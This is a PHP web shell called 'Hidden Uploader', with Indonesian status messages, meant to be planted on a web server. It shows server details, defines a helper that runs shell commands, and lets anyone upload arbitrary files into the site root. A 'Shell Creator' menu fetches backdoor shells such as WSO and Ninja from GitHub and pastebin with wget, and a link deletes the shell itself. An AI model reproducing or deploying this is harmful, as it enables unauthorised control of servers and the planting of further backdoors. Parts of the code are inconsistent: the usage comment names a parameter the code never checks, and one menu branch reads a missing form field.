<?php
#######
##Usage: site/yourfile.php?show
#######
if(isset($_GET['kaluar'])){
?>
<html>
<head>
<title>$Hidden Uploader$</title>	
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
background-color: black;
color: white;
	font-size: 13px;
}
a{
color:red;
text-decoration: none;
}
textarea{
backgroud-color:#333333;
color: white;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Ubuntu';
    font-size: 13px;
}
select{
border: 1px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input[type=submit] {
    background: transparent;
    color: #ffffff;
    height: 24px;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
</style>
</head>
<center>
<img src="https://media.giphy.com/media/26gsvp8v9bZCLhiOQ/source.gif" width="200px" height="270px"><br>
<font color='white' size="6">$</font><font color='blue' size="8">Hidden Uploader</font><font color='white' size="6">$</font><br>
<body bgcolor="black">
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
	}
  return stripslashes($text);
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "&nbsp;<a href='?show' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?c7e=kill' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?bye=logout' style='color:red;border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='file'>
<input type='submit' value='upload' name='upload'>
</form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "sukses upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
	echo"<table align=center>";
    echo"<td>";
    echo"<form method='post'> ";  
    echo"<select name='shell' style=padding:5px 10px;>";  
    echo"<option selected'>        Shell Creator       </option>"; 
    echo"<option value='wsologin'>         WSO LOGIN       </option>";  
    echo"<option value='wsoold'>         WSO OLD       </option>";  
    echo"<option value='idx'>         IDX Shell       </option>"; 
    echo"<option value='marju'>         MARIJUANA      </option>";  
    echo"<option value='jquery'>       jquery Shell       </option>";  
    echo"<option value='ninja'>         NINJA       </option>"; 
    echo"<option value='tt'>         WSO OBFUS Shell       </option>";
    echo"<option value='noname'>         Noname Shell       </option>";  
    echo "</select>";
    echo"&nbsp;<input type='submit' class='btn btn-success btn-sm' name='enter' value='Submit!'>";  
 if(isset($_POST['enter']))   {  
 if ($_POST['lucknut'] == 'wsologin')  {  
 $exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/wsologin.php -O wsologin.php');
 if(file_exists('./wsologin.php')){
 echo '<center><a href=./wsologin.php target="_blank"> wsologin.php </a> upload sukses !</center>';
} else {
echo '<center>gagal upload !</center>';
}
}elseif($_POST['shell'] == 'idx') {
		$exec=exec('wget http://pastebin.com/raw.php?i=nC6pWh5a -O idx.php');
        if(file_exists('./idx.php')){
            echo '<center><a href=./idx.php target="_blank"> idx.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'marju') {
		$exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/HTML/master/marju.txt -O marju.php');
        if(file_exists('./marju.php')){
            echo '<center><a href=./marju.php target="_blank"> marju.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'wsoold') {
		$exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/wsologin2.php -O wsoold.php');
        if(file_exists('./wsoold.php')){
            echo '<center><a href=./wsoold.php target="_blank"> wsoold.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'jquery') {
		$exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/jquery.php -O jquery.php');
        if(file_exists('./jquery.php')){
            echo '<center><a href=./jquery.php target="_blank"> jquery.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'ninja') {
		$exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/ninja.php -O ninja.php');
        if(file_exists('./ninja.php')){
            echo '<center><a href=./ninja.php target="_blank"> ninja.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'tt') {
		$exec=exec('wget https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/tt.php -O test.php');
        if(file_exists('./test.php')){
            echo '<center><a href=./test.php target="_blank"> test.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'noname') {
		$exec=exec('wget http://pastebin.com/raw.php?i=BRCmf02c -O noname.php');
        if(file_exists('./noname.php')){
            echo '<center><a href=./noname.php target="_blank"> noname.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }        
     }
}
}
elseif($_GET['bye'] == 'logout') {
	

echo '<form action="?dir=$dir&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Good Bye!!';
}
elseif($_GET['c7e'] == 'kill') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
}
?>
</center>
</html>
